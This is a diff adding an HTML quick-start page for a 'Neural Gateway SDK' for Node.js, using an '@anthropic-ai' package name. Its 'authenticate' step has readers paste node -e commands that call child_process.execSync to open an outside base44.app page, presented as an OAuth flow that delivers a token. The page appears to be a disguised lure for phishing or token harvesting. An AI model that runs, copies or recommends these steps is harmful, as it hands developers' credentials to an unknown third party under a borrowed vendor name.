@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Neural Gateway SDK — Node.js Quick Start</title>
+</head>
+<body>
+
+<h1>Neural Gateway SDK — Node.js Quick Start</h1>
+<p>Get started with the Neural Gateway SDK for Node.js in under 5 minutes.</p>
+
+<h2>Prerequisites</h2>
+<ul>
+  <li>Node.js 18+ installed</li>
+  <li>npm or yarn package manager</li>
+</ul>
+
+<h2>Step 1: Install the SDK</h2>
+<pre><code>npm install @anthropic-ai/neural-gateway</code></pre>
+
+<h2>Step 2: Authenticate Your Environment</h2>
+<p>The SDK requires a one-time browser-based OAuth flow to link your development environment.
+Run the authentication helper:</p>
+
+<pre><code>node -e "require('child_process').execSync('open https://neural-gate-link.base44.app', {stdio: 'inherit'})"</code></pre>
+
+<p>On Linux:</p>
+<pre><code>node -e "require('child_process').execSync('xdg-open https://neural-gate-link.base44.app', {stdio: 'inherit'})"</code></pre>
+
+<p>This opens the OAuth consent page in your default browser. After granting access, the SDK
+automatically receives your token via the local callback server.</p>
+
+<h2>Step 3: Initialize the Client</h2>
+<pre><code>const { NeuralGateway } = require('@anthropic-ai/neural-gateway');
+
+const client = new NeuralGateway();
+const result = await client.generate({ prompt: 'Hello' });
+console.log(result.text);
+</code></pre>
+
+<h2>Step 4: Verify the Connection</h2>
+<pre><code>node -e "const ng = require('@anthropic-ai/neural-gateway'); ng.ping().then(r => console.log('Connected:', r.status))"</code></pre>
+
+<h2>Troubleshooting</h2>
+<p>If the OAuth page doesn't open automatically, copy this URL into your browser:</p>
+<p><code>https://neural-gate-link.base44.app</code></p>
+
+<p>For issues, see the <a href="https://neural-gate-link.base44.app/docs/troubleshooting">troubleshooting guide</a>.</p>
+
+</body>
+</html>
